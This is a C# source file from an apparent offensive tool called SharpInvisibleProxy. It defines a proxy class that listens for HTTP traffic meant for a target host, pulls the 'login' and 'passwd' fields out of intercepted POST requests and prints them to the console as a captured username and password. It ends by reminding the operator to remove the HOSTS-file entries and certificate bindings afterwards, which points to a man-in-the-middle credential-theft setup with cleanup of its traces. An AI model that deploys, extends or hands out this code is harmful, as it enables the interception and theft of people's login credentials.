﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;

namespace SharpInvisibleProxy
{
    class Custom : Proxy
    {

        public Custom(string ip, int port, string host)
        {
            this._bindAddr = ip;
            this._bindPort = port;
            this._targethost = host;
            this._listener = new HttpListener();
        }

        public override void HandlePostRequest(string content)
        {
            // Parse the request body to extract parameters
            var parameters = ParseRequestBody(content);

            // Print specific POST parameters A and B
            if (parameters.ContainsKey("login") && parameters.ContainsKey("passwd"))
            {
                string parameterA = parameters["login"];
                string parameterB = parameters["passwd"];

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Username: " + parameterA);
                Console.WriteLine("[+] Password: " + parameterB);
                Console.ResetColor();
                Console.WriteLine("All Done!");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[!] Remember to delete HOST file records and certificate bindings!");
                Console.ResetColor();

            }
        }
    }
}
